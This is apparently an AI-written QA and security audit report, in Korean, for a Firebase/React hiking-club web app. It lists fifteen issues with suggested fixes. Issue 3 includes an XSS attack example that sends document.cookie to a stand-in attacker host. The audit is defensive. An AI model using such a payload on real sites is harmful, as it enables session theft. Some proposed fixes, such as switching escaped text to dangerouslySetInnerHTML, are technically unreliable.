# 🔍 시애라클럽 QA 이슈 리스트

> **검토일**: 2026-02-08
> **총 이슈**: 15건 (Critical: 2, High: 3, Medium: 8, Low: 2)

---

## 📊 데이터 연동 현황

### ✅ 확인 완료
- **Firebase 실제 데이터 연동**: 모든 페이지가 Firestore를 통해 실제 데이터 사용 중
- **프로젝트 ID**: `sierra-be167` (프로덕션 Firebase)
- **환경 변수**: `.env.local`에 실제 Firebase 설정 완료
- **Mock 데이터**: `src/data/` 폴더에 존재하지만 실제로는 사용되지 않음 (참조용)

### 데이터 흐름
```
Service Layer → Firebase Firestore → Context API → React Components
```

---

## 🔴 CRITICAL - 즉시 수정 필요 (1-2일)

### 1. 하드코딩된 개발자 이메일 관리자 권한 부여 🚨

**파일**: `src/contexts/AuthContextEnhanced.tsx` (84-92줄)

**문제**:
```typescript
// 🔥 개발용: 특정 이메일을 관리자로 설정
const isDevAdmin = firebaseUser.email === 'choi@yigolab.com';

const newUser: User = {
  id: firebaseUser.uid,
  name: firebaseUser.displayName || (isDevAdmin ? '최효준 (개발자)' : ''),
  email: firebaseUser.email || '',
  role: isDevAdmin ? 'chairman' : 'member',
  isApproved: isDevAdmin ? true : false,
  // ...
};
```

**영향**:
- 권한 우회 취약점
- 해당 이메일로 누구나 관리자 권한 획득 가능
- 승인 프로세스 무력화

**수정 방법**:
1. 84-92줄의 `isDevAdmin` 로직 완전 제거
2. Custom Claims를 통한 관리자 권한 부여로 대체
3. Firebase Console 또는 Admin SDK로 관리자 설정

```typescript
// ❌ 제거할 코드
const isDevAdmin = firebaseUser.email === 'choi@yigolab.com';

// ✅ 수정 후
const newUser: User = {
  id: firebaseUser.uid,
  name: firebaseUser.displayName || '',
  email: firebaseUser.email || '',
  role: 'member', // 기본값, Custom Claims로 override
  isApproved: false, // 기본값, 승인 후 변경
  // ...
};
```

---

### 2. 대량의 console.log 및 개인정보 노출 🚨

**영향 파일**:
- `src/pages/Home.tsx` (29-87줄) - ~10개
- `src/pages/Gallery.tsx` (36-705줄) - ~30개
- `src/pages/Admin/MemberManagement.tsx` (57-96줄) - ~15개
- `src/pages/GuestApplication.tsx` - ~6개
- `src/pages/Profile.tsx` - ~12개
- `src/contexts/AuthContextEnhanced.tsx` (261-264, 312-316줄)
- `src/contexts/GuestApplicationContext.tsx`
- `src/contexts/PendingUserContext.tsx`

**문제**:
```typescript
// ❌ 개인정보 노출 예시
console.log('🚀 회원가입 시작:', {
  email: userData.email,  // 이메일 노출
  name: userData.name,    // 이름 노출
});

console.log('👤 현재 사용자:', user?.email || 'null');
console.log('📋 가입 대기자 정보:', pendingUser); // 전체 개인정보 노출
```

**수정 방법**:
1. 모든 개인정보 포함 console.log 제거
2. 에러 로깅만 남기되, 개인정보 제외
3. 프로덕션 빌드 후 콘솔 확인

```typescript
// ✅ 수정 후 (에러 로깅만)
console.error('회원가입 실패:', error.code); // 개인정보 제외
// 또는 완전 제거
```

**참고**: `vite.config.ts`에 프로덕션 빌드 시 console 제거 설정이 있지만, 개발 환경에서는 동작함

---

## 🟠 HIGH - 1주 내 수정

### 3. XSS 취약점 - 사용자 입력 콘텐츠 미검증

**파일**:
- `src/pages/Admin/ContentManagement.tsx` (299, 345줄)
- `src/pages/Admin/MemberManagement.tsx` (1173줄)

**문제**:
```typescript
// ❌ 위험: 사용자 입력을 직접 렌더링
<p className="text-slate-700">{notice.content}</p>
<p className="text-slate-700 whitespace-pre-wrap">{selectedPendingUser.applicationMessage}</p>
```

**공격 시나리오**:
```javascript
// 사용자가 입력 시
<img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">
// → 세션 탈취 가능
```

**수정 방법**:
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```typescript
import DOMPurify from 'dompurify';

// ✅ 수정 후
<p className="text-slate-700"
   dangerouslySetInnerHTML={{
     __html: DOMPurify.sanitize(notice.content)
   }}
/>
```

**적용 위치**:
- 게시판 글 내용
- 댓글 내용
- 공지사항 내용
- 회원 신청 메시지
- 사용자 프로필 소개

---

### 4. 약한 이메일 유효성 검사

**파일**: `src/pages/Register.tsx` (62-117줄)

**문제**:
```typescript
// ❌ 너무 관대한 정규식
else if (!/\S+@\S+\.\S+/.test(formData.email)) {
  newErrors.email = '올바른 이메일 형식이 아닙니다.';
}
// 'a@b.c' 같은 잘못된 이메일도 허용됨
```

**수정 방법 1** (간단):
```typescript
// ✅ 더 엄격한 정규식
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
if (!emailRegex.test(formData.email)) {
  newErrors.email = '올바른 이메일 형식이 아닙니다.';
}
```

**수정 방법 2** (권장):
```bash
npm install validator
npm install --save-dev @types/validator
```

```typescript
import validator from 'validator';

if (!validator.isEmail(formData.email)) {
  newErrors.email = '올바른 이메일 형식이 아닙니다.';
}
```

---

### 5. Firebase Rules 무제한 생성 권한

**파일**: `firestore.rules` (303줄)

**문제**:
```javascript
match /guestApplications/{applicationId} {
  // ⚠️ 위험: 인증 없이 누구나 생성 가능
  allow create: if true;
}
```

**영향**:
- DoS 공격 가능 (무제한 문서 생성)
- 스팸 신청 가능
- 데이터베이스 비용 증가

**수정 방법**:
```javascript
match /guestApplications/{applicationId} {
  // ✅ 옵션 1: 인증 필수
  allow create: if request.auth != null;

  // ✅ 옵션 2: 데이터 검증 추가
  allow create: if request.auth != null
    && request.resource.data.name is string
    && request.resource.data.name.size() > 0
    && request.resource.data.email is string
    && request.resource.data.email.matches('.*@.*\\..*');

  // ✅ 옵션 3: rate limiting (Firestore Extensions 사용)
  // Firebase Extensions > Rate Limiting 설치
}
```

**추가 검토 필요**:
```javascript
// firestore.rules 258-261줄
match /participations/{participationId} {
  // 현재: 모든 인증된 사용자가 생성 가능
  allow create: if isAuthenticated();

  // ✅ 권장: 승인된 회원 또는 게스트만
  allow create: if isAuthenticated()
    && (isApprovedMember() || isValidGuest());
}
```

---

## 🟡 MEDIUM - 2주 내 수정

### 6. 53개 이상의 alert() 사용

**위치**: 전체 프로젝트

**문제**:
- UX 저하 (브라우저 alert는 구식)
- 일관성 없는 사용자 피드백
- 모바일에서 경험 불량

**수정 방법**:
```bash
npm install react-hot-toast
```

```typescript
// src/utils/toast.ts 생성
import toast from 'react-hot-toast';

export const showSuccess = (message: string) => {
  toast.success(message, { duration: 3000 });
};

export const showError = (message: string) => {
  toast.error(message, { duration: 4000 });
};

export const showInfo = (message: string) => {
  toast(message, { duration: 3000 });
};
```

```typescript
// App.tsx에 추가
import { Toaster } from 'react-hot-toast';

function App() {
  return (
    <>
      <Toaster position="top-right" />
      {/* 기존 코드 */}
    </>
  );
}
```

**대체 예시**:
```typescript
// ❌ 기존
alert('신청이 완료되었습니다.');

// ✅ 수정 후
showSuccess('신청이 완료되었습니다.');
```

---

### 7. 비밀번호 재인증 무제한 시도

**파일**: `src/pages/Admin/MemberManagement.tsx` (107-141줄)

**문제**: rate limiting 없음 → 무차별 대입 공격 가능

**수정 방법**:
```typescript
// 상태 추가
const [failedAttempts, setFailedAttempts] = useState(0);
const [isLocked, setIsLocked] = useState(false);

const handlePasswordConfirm = async () => {
  // ✅ 잠금 확인
  if (isLocked) {
    showError('너무 많은 시도가 있었습니다. 5분 후 다시 시도해주세요.');
    return;
  }

  // ✅ 시도 횟수 제한
  if (failedAttempts >= 3) {
    setIsLocked(true);
    setTimeout(() => {
      setIsLocked(false);
      setFailedAttempts(0);
    }, 5 * 60 * 1000); // 5분
    showError('계정이 일시적으로 잠겼습니다. 5분 후 다시 시도해주세요.');
    return;
  }

  try {
    const credential = EmailAuthProvider.credential(user.email, passwordInput);
    await reauthenticateWithCredential(auth.currentUser, credential);

    // 성공 시 리셋
    setFailedAttempts(0);
    // ... 기존 로직
  } catch (error: any) {
    // ✅ 실패 횟수 증가
    setFailedAttempts(prev => prev + 1);

    if (error.code === 'auth/wrong-password') {
      showError(`비밀번호가 올바르지 않습니다. (${3 - failedAttempts - 1}회 남음)`);
    }
    // ...
  }
};
```

---

### 8. 미구현 TODO 기능들

**파일 및 위치**:

1. **`src/pages/Events.tsx` (189줄)**
   ```typescript
   // TODO: 실제 취소 로직 (백엔드 API 호출)
   ```
   **권장**:
   - Firebase에서 participation 문서 삭제 구현
   - 또는 UI에서 취소 버튼 임시 숨김

2. **`src/pages/QuickEventApply.tsx` (140줄)**
   ```typescript
   // TODO: 실제 Firebase 연동 - ParticipationContext 사용
   ```
   **권장**:
   - ParticipationContext import 및 사용
   - 또는 해당 페이지 비활성화

3. **`src/pages/Admin/Attendance.tsx` (10-14줄)**
   ```typescript
   // TODO: 실제로는 별도의 attendance 컬렉션에서 출석 데이터를 가져와야 함
   ```
   **권장**:
   - Firestore `attendances` 컬렉션 연동
   - 또는 Mock 데이터 사용 명시

---

### 9. TypeScript any 타입 남용

**수정 위치**:

1. **`src/pages/Home.tsx` (93-95줄)**
   ```typescript
   // ❌ 현재
   calculateStats = {
     getTotalMembers: (members: any[]) => members.length,
     getActiveMembers: (members: any[]) => members.filter(m => m.attendanceRate > 0).length,
   }

   // ✅ 수정
   import { Member } from '../types';

   calculateStats = {
     getTotalMembers: (members: Member[]) => members.length,
     getActiveMembers: (members: Member[]) => members.filter(m => m.attendanceRate > 0).length,
   }
   ```

2. **`src/pages/Admin/MemberManagement.tsx` (52줄)**
   ```typescript
   // ❌ 현재
   const [selectedGuestApplication, setSelectedGuestApplication] = useState<any | null>(null);

   // ✅ 수정
   import { GuestApplication } from '../../types';
   const [selectedGuestApplication, setSelectedGuestApplication] = useState<GuestApplication | null>(null);
   ```

---

### 10. 에러 처리 불완전

**문제 패턴**:
```typescript
// ❌ 현재: 에러 재throw만
catch (err: any) {
  logError(err, ErrorLevel.ERROR, ErrorCategory.DATABASE);
  throw err; // 사용자에게 피드백 없음
}
```

**수정 패턴**:
```typescript
// ✅ 수정 후
catch (err: any) {
  const message = err instanceof Error ? err.message : '알 수 없는 오류';
  logError(err, ErrorLevel.ERROR, ErrorCategory.DATABASE);
  showError(`작업에 실패했습니다: ${message}`);
  // throw 대신 사용자 피드백 제공
}
```

**적용 위치**:
- `src/contexts/PendingUserContext.tsx` (140-150줄)
- `src/contexts/GuestApplicationContext.tsx` (85-120줄)
- `src/pages/Admin/MemberManagement.tsx` (163-166줄)

---

### 11. 하드코딩된 값들

**수정 필요 위치**:

1. **날씨 데이터** (`src/pages/Events.tsx` 25-33줄)
   ```typescript
   // ❌ 하드코딩
   const weatherData = {
     current: { temp: 12, condition: 'cloudy' as const, humidity: 65 },
     // ...
   };

   // ✅ 수정: 실제 API 연동 (이미 .env.local에 API 키 있음)
   const { data: weatherData } = useWeather(event.location);
   ```

2. **과거 산행 목록** (`src/pages/Events.tsx` 89-108줄)
   ```typescript
   // ❌ 하드코딩
   const pastEvents = [
     { id: '1', title: '북한산 백운대 코스', date: '2024-03-15', ... },
   ];

   // ✅ 수정: Firestore에서 로드
   const { pastEvents } = useEvents({ filter: 'past', limit: 3 });
   ```

3. **이미지 URL** (`src/pages/Home.tsx` 213, 386줄)
   ```typescript
   // ❌ 하드코딩
   backgroundImage: 'url(https://images.unsplash.com/...)'

   // ✅ 수정: 환경 변수 또는 Firestore에서 관리
   backgroundImage: `url(${config.images.heroBanner})`
   ```

---

### 12. 메모리 누수 가능성

**수정 위치**:

1. **`src/pages/Gallery.tsx` (135-145줄) - Slideshow interval**
   ```typescript
   // ❌ 현재: cleanup 없음
   useEffect(() => {
     const interval = setInterval(() => {
       // slideshow logic
     }, 3000);
     // return cleanup 누락!
   }, []);

   // ✅ 수정
   useEffect(() => {
     const interval = setInterval(() => {
       // slideshow logic
     }, 3000);

     return () => clearInterval(interval); // cleanup 추가
   }, []);
   ```

2. **`src/pages/Gallery.tsx` (273줄) - URL.revokeObjectURL**
   ```typescript
   // ❌ 현재
   if (file) URL.revokeObjectURL(file.preview);

   // ✅ 수정: finally 블록에서도 호출
   try {
     // upload logic
   } finally {
     files.forEach(file => {
       if (file.preview) URL.revokeObjectURL(file.preview);
     });
   }
   ```

---

### 13. prompt() 사용으로 인한 보안 위험

**파일**: `src/pages/Admin/MemberManagement.tsx` (169-170줄)

**문제**:
```typescript
// ❌ 위험: sanitize 없음, XSS 가능
const reason = prompt('거절 사유를 입력해주세요 (선택):');
await rejectPendingUser(userId, reason || undefined);
```

**수정 방법**: 모달로 대체
```typescript
// ✅ 수정: 모달 사용
const [showRejectModal, setShowRejectModal] = useState(false);
const [rejectReason, setRejectReason] = useState('');

const handleReject = () => {
  setShowRejectModal(true);
};

const confirmReject = async () => {
  const sanitizedReason = DOMPurify.sanitize(rejectReason);
  await rejectPendingUser(userId, sanitizedReason || undefined);
  setShowRejectModal(false);
  setRejectReason('');
};

// JSX
{showRejectModal && (
  <Modal onClose={() => setShowRejectModal(false)}>
    <textarea
      value={rejectReason}
      onChange={(e) => setRejectReason(e.target.value)}
      placeholder="거절 사유를 입력해주세요 (선택)"
    />
    <button onClick={confirmReject}>확인</button>
  </Modal>
)}
```

---

## 🟢 LOW - 지속 개선

### 14. 성능 최적화

**useMemo/useCallback 추가 필요**:

1. **`src/pages/Home.tsx` (93줄)**
   ```typescript
   // ❌ 매 렌더링마다 재생성
   const calculateStats = { ... };

   // ✅ useMemo 사용
   const calculateStats = useMemo(() => ({
     getTotalMembers: (members: Member[]) => members.length,
     getActiveMembers: (members: Member[]) => members.filter(m => m.attendanceRate > 0).length,
   }), []);
   ```

2. **`src/pages/Events.tsx` (36-49줄)**
   ```typescript
   // ❌ 매 렌더링마다 재생성
   const getWeatherIcon = (condition: string) => { ... };

   // ✅ useCallback 사용
   const getWeatherIcon = useCallback((condition: string) => {
     // ...
   }, []);
   ```

---

### 15. 미사용 Mock 데이터 파일

**위치**: `src/data/`

**파일들**:
- `mockEvents.ts`
- `mockMembers.ts`
- `mockPosts.ts`
- 기타 mock 파일들

**상태**: 실제로 사용되지 않음 (Firebase 연동 완료)

**권장 조치**:
```bash
# 옵션 1: 제거
rm -rf src/data/

# 옵션 2: 참조용으로 보관하되 README 추가
echo "# Mock Data (Reference Only)\n\n이 폴더는 참조용입니다. 실제 앱은 Firebase를 사용합니다." > src/data/README.md
```

---

## 📋 배포 전 체크리스트

작업 완료 시 체크하세요:

- [ ] 하드코딩된 개발자 이메일 제거 (`AuthContextEnhanced.tsx`)
- [ ] 모든 console.log 제거 확인 (프로덕션 빌드 테스트)
- [ ] XSS 방어 DOMPurify 적용
- [ ] Firebase 보안 규칙 강화
- [ ] 이메일 유효성 검사 개선
- [ ] Toast 알림 시스템 구현
- [ ] 비밀번호 재인증 rate limiting
- [ ] TODO 기능 구현 또는 UI 숨김
- [ ] TypeScript any 타입 제거
- [ ] 에러 처리 개선
- [ ] 하드코딩 값 제거
- [ ] 메모리 누수 수정
- [ ] prompt() → 모달로 대체
- [ ] 성능 최적화 (useMemo/useCallback)
- [ ] 전체 기능 테스트

---

## 🔗 추가 참고 자료

- **Firebase 보안 규칙**: [Firebase Security Rules Guide](https://firebase.google.com/docs/rules)
- **DOMPurify**: [GitHub - cure53/DOMPurify](https://github.com/cure53/DOMPurify)
- **React Hot Toast**: [react-hot-toast.com](https://react-hot-toast.com/)
- **Validator.js**: [GitHub - validatorjs/validator.js](https://github.com/validatorjs/validator.js)

---

**작성일**: 2026-02-08
**검토자**: Claude QA Agent
